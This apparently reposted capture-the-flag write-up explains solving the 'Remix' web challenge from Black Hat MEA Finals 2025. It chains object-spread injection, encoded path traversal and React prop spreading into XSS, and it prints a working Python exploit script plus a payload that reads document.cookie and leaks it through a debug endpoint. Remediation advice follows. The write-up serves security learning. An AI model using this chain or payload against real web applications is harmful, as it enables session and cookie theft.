# :globe_with_meridians: Remix - Black Hat MEA Finals CTF 2025 Web Challenge Writeup

> **Original Source:** [Remix - Black Hat MEA Finals CTF 2025 Web Challenge Writeup](https://0x-professor.medium.com/remix-black-hat-mea-finals-ctf-2025-web-challenge-writeup-b3aaeb35ae5f)
> **Platform:** 0x-professor.medium.com | **Category:** `WEB` | **Year:** 2025

---

# Remix — Black Hat MEA Finals CTF 2025 Web Challenge Writeup


*A deep dive into chaining Next.js vulnerabilities for XSS and cookie exfiltration*

## Introduction


During the Black Hat MEA Finals CTF 2025 held in Riyadh (December 2, 2025), I tackled “Remix,” a challenging web security problem that required chaining multiple vulnerabilities in a Next.js application. This writeup documents my exploitation approach and the technical insights I gained.

## Challenge Overview


Challenge: Remix
Category: Web
Flag: `BHFlagY{00b76481b000f5448858f72a3990bf79}`


The challenge presented a Next.js music remix sharing application with a bot component that visits user-submitted URLs. The goal was to exploit vulnerabilities to exfiltrate the admin’s flag cookie.

## Initial Reconnaissance


After examining the challenge environment, I identified:


- Frontend/Backend: Next.js 15.5.6 with React 19.1.0

- Bot: Puppeteer (headless Chrome) for simulating admin visits

- Sandboxing: nsjail with `--disable_clone_newnet` (shared network namespace)


The shared network configuration was crucial it meant the bot could access internal API endpoints, but outbound internet connections were blocked. This constraint would shape my exfiltration strategy.

## Vulnerability Discovery


I discovered four distinct vulnerabilities that could be chained together:

## 1. Object Spread Injection in API Endpoint


While analyzing `/api/interactions.ts`, I found dangerous user input handling:


```
const interaction: Interaction = {
id: getNextInteractionId(),
username,
date: new Date().toISOString(),
...req.body // ← Spreads ALL properties from request body
};
```


This pattern allows attackers to inject arbitrary properties beyond the intended `remixId` and `content` fields. I could inject properties like `isDraft` and `draft` that would be stored with the interaction object.

## 2. Path Traversal via URL Encoding


The remix viewing page had an interesting URL handling pattern in `/pages/remix/[id].tsx`:


```
useEffect(() => {
if (id) {
fetchRemix(decodeURIComponent(id as string));
}
}, [id]);

const fetchRemix = async (slug: string) => {
const response = await fetch(`/api/remixes/${slug}`);
};
```


The vulnerability chain works as follows:


- Visiting `/remix/..%2Finteractions%2F123`

- React Router passes the encoded string to the component

- `decodeURIComponent` converts `..%2Finteractions%2F123` → `../interactions/123`

- The fetch call becomes `/api/remixes/../interactions/123`

- Browser path normalization resolves this to `/api/interactions/123`


This allowed me to force the page to load interaction data as if it were remix data a critical type confusion vulnerability.

## 3. Dangerous Object Spread to DOM


The remix display component had a seemingly innocent draft preview feature:


```
{remix.isDraft && (
<div>
<p> This remix is currently unreleased...</p>
<button {...remix.draft} />
</div>
)}
```


When `isDraft` is true, the entire `draft` object gets spread as props onto the button element. React's `dangerouslySetInnerHTML` is just another prop if I could inject it via the `draft` object, I would achieve XSS despite React's built-in protections.​

## 4. Internal Exfiltration via Debug API


With outbound connections blocked, I needed a creative exfiltration method. The debug endpoint at `/api/debug/mkdir.ts` provided the solution:


```
const targetPath = path.join('/tmp', folderPath);
fs.mkdirSync(targetPath, { recursive: true });
```


This endpoint creates directories in `/tmp` with user-controlled names. By encoding the cookie value into the directory name, I could store the flag in the filesystem, then retrieve it using the companion `/api/debug/ls` endpoint.

## Exploitation Methodology


## Step 1: Setting Up the Attack Environment


First, I registered an attacker account to interact with the API:


```
import requests
import urllib.parse

BASE_URL = "http://challenge-url"
session = requests.Session()

# Register attacker account
session.post(f"{BASE_URL}/api/auth/register", json={
"username": "Professor",
"password": "password123"
})
```


## Step 2: Crafting the Malicious Payload


I constructed an XSS payload that would exfiltrate cookies via the internal debug API:


```
# XSS payload that exfiltrates cookies using internal API
xss_payload = """<img src=x onerror="fetch('/api/debug/mkdir?path=EXFIL_'+document.cookie.replace(/[^a-zA-Z0-9_]/g,'_'))">"""

# Create malicious interaction with injected properties
response = session.post(f"{BASE_URL}/api/interactions", json={
# Normal interaction fields
"remixId": "exploit",
"content": "Exploit content",

# Injected Remix-specific properties (vulnerability #1)
"title": "Exploit Remix",
"artist": "Professor",
"genre": "Synthwave",
"duration": "1:00",

# XSS trigger properties (vulnerability #3)
"isDraft": True,
"draft": {
"dangerouslySetInnerHTML": {
"__html": xss_payload
}
}
})

interaction_id = response.json()['id']
print(f"Created malicious interaction: {interaction_id}")
```


## Step 3: Triggering the Exploit Chain


With the malicious interaction created, I used the path traversal vulnerability to trick the bot:


```
# Construct path traversal URL (vulnerability #2)
encoded_path = urllib.parse.quote(f"../interactions/{interaction_id}", safe='')
bot_path = f"remix/{encoded_path}"

print(f"Triggering bot with path: {bot_path}")

# Submit to bot endpoint
session.post(f"{BASE_URL}/api/bot", json={
"path": bot_path
})
```


## Step 4: Retrieving the Exfiltrated Flag


After waiting a few seconds for the bot to execute, I queried the debug endpoint:


```
import time

time.sleep(5) # Wait for bot execution

# List directories in /tmp
response = requests.get(f"{BASE_URL}/api/debug/ls", params={"path": "/"})
directories = response.json()

# Find the exfiltrated flag directory
for dir_name in directories:
if dir_name.startswith("EXFIL_"):
flag = dir_name.replace("EXFIL_FLAG_", "FLAG{").replace("_", "")
print(f"Flag found: {flag}")
```


## Attack Flow Visualization


The complete attack chain flows through these stages:


```
┌─────────────────────────────────────────────────────────────────────┐
│ 1. INJECTION PHASE │
│ Create malicious interaction with: │
│ • isDraft: true (enables draft rendering) │
│ • draft: { dangerouslySetInnerHTML: { __html: XSS } } │
└─────────────────────────────────────────────────────────────────────┘
↓
┌─────────────────────────────────────────────────────────────────────┐
│ 2. DELIVERY PHASE │
│ Trigger bot to visit: /remix/..%2Finteractions%2F{id} │
└─────────────────────────────────────────────────────────────────────┘
↓
┌─────────────────────────────────────────────────────────────────────┐
│ 3. TYPE CONFUSION PHASE │
│ • URL decoding: ..%2Finteractions%2F{id} → ../interactions/{id} │
│ • API fetch: /api/remixes/../interactions/{id} │
│ • Browser normalization: /api/interactions/{id} │
│ • Interaction loaded as "remix" data │
└─────────────────────────────────────────────────────────────────────┘
↓
┌─────────────────────────────────────────────────────────────────────┐
│ 4. XSS EXECUTION PHASE │
│ • React checks isDraft = true → renders draft section │
│ • <button {...remix.draft} /> spreads props │
│ • dangerouslySetInnerHTML bypasses XSS protection │
│ • Payload executes: <img onerror=...> │
└─────────────────────────────────────────────────────────────────────┘
↓
┌─────────────────────────────────────────────────────────────────────┐
│ 5. EXFILTRATION PHASE │
│ • XSS reads document.cookie (FLAG=BHFlagY{...}) │
│ • Calls /api/debug/mkdir?path=EXFIL_{sanitized_cookie} │
│ • Creates directory in /tmp with flag in name │
└─────────────────────────────────────────────────────────────────────┘
↓
┌─────────────────────────────────────────────────────────────────────┐
│ 6. RETRIEVAL PHASE │
│ • Query /api/debug/ls?path=/ │
│ • Parse directory name: EXFIL_FLAG_BHFlagY_00b76481b000f5448858... │
│ • Extract flag: BHFlagY{00b76481b000f5448858f72a3990bf79} │
└─────────────────────────────────────────────────────────────────────┘
```


## Remediation Recommendations


Based on this exploit, I recommend the following security improvements:


- Input Validation: Implement strict allowlisting for API inputs


```
const allowedFields = ['remixId', 'content'];
const sanitized = Object.keys(req.body)
.filter(key => allowedFields.includes(key))
.reduce((obj, key) => ({ ...obj, [key]: req.body[key] }), {});
```


- Remove Debug Endpoints: Disable or remove debug/administrative endpoints in production environments

- Secure Cookie Configuration: Set `httpOnly: true` and `sameSite: 'strict'` on sensitive cookies

- Path Sanitization: Validate and sanitize all path parameters before using in fetch operations

- Prop Spreading Controls: Never spread untrusted objects directly onto React components

## Conclusion


The Remix challenge from Black Hat MEA Finals CTF 2025 demonstrated how modern web frameworks’ convenience features can introduce subtle security vulnerabilities. By chaining object injection, path traversal, React XSS, and creative exfiltration techniques, I successfully captured the flag.​


This challenge reinforced the importance of understanding both the security model of your frameworks and how different components interact vulnerabilities often exist at the boundaries between systems.


Flag: `BHFlagY{00b76481b000f5448858f72a3990bf79}`

---

*Originally published on [Medium](https://0x-professor.medium.com/remix-black-hat-mea-finals-ctf-2025-web-challenge-writeup-b3aaeb35ae5f). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
